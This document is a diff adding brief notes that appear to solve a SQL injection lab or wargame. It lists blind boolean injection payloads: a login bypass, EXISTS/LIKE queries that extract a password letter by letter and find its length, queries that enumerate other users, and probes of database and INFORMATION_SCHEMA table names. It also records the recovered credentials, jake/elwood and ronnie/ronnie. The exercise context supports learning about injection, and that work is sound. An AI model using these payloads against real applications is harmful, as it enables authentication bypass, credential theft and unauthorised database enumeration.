@@ -1,0 +1,48 @@
+Discover the user name:
+	'OR''='
+
+Discover if the password a specific char:
+	' OR EXISTS(SELECT * FROM users WHERE name='jake' AND password LIKE '%e%') AND ''='
+
+Discover the position of the letter:
+	' OR EXISTS(SELECT * FROM users WHERE name='jake' AND password LIKE '__w%') AND ''='
+
+Testing the size of the password:
+	' OR EXISTS(SELECT * FROM users WHERE name='jake' AND password LIKE '______') AND ''='
+
+#to solve:
+
+User: jake
+letters in the password: d ,e, l, o, w
+positions accepted: __w%, e%, _l_%, ___o%, 
+=> elwo 
+Password: elwood
+
+#Finding another user:
+
+Are there more than 10 rows in the password table?
+    ' OR (SELECT COUNT(*) FROM users)>10 AND ''='
+Is there a user with an r in his name?
+    ' OR EXISTS(SELECT * FROM users WHERE name LIKE '%r%') AND ''='
+Is there a user (other than jake) with an a in his name?
+    ' OR EXISTS(SELECT * FROM users WHERE name!='jake' AND name LIKE '%a%') AND ''=' 
+
+#Trying to find another user:
+' OR EXISTS(SELECT * FROM users WHERE name LIKE 'r%') AND ''='
+	=> r, ro
+#Catching a name in the forum:
+	=> ronnie
+#His password has six letters
+#Now we get back to the password:
+e, i, o, 
+#So:
+	User: ronnie
+	Pass: ronnie
+
+
+Does the current database contain the letter j?
+    ' OR EXISTS(SELECT 1 FROM dual WHERE database() LIKE '%j%') AND ''='
+Is there a table called one in database test?
+    ' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='test' AND TABLE_NAME='one') AND ''='
+Is there more than one table in the database(s) containing a j?
+    ' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE '%j%')>1 AND ''=' 
